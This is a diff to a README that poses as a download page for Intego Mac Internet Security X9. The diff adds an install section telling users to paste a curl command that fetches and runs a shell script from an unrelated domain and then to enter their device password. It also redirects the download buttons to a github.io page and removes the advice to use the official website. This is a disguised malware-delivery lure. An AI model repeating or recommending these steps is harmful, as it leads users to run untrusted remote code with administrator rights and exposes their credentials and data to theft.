@@ -7,9 +7,34 @@ Tailored to take full advantage of macOS and Apple Silicon, Intego delivers fast
 ---
 
 ## ✅ Download Intego Mac Internet Security X9  
-[![Download Intego](https://img.shields.io/badge/Download-Intego-blueviolet)](#)
+[![Download Intego](https://img.shields.io/badge/Download-Intego-blueviolet)](https://intego-mac-internet-download-mac.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
+
 
 ## 🛡️ What is Intego Mac Internet Security X9?
 
@@ -42,19 +67,10 @@ Designed exclusively for Mac, Intego ensures minimal system impact while keeping
 
 ---
 
-[![Download Intego](https://img.shields.io/badge/Download-Intego-blueviolet)](#)
+[![Download Intego](https://img.shields.io/badge/Download-Intego-blueviolet)](https://intego-mac-internet-download-mac.github.io/.github)
 
 ---
 
-## 📥 How to Use
-
-- ✅ Download and install Intego Mac Internet Security X9 from the official website  
-- 🔍 Run a full system scan to detect and remove threats  
-- 🔥 Configure firewall settings with NetBarrier for optimal network security  
-- 🛡 Enable real-time protection and automatic updates  
-- 🔄 Regularly monitor security reports and alerts  
-
----
 
 ## 🖼 Preview
 
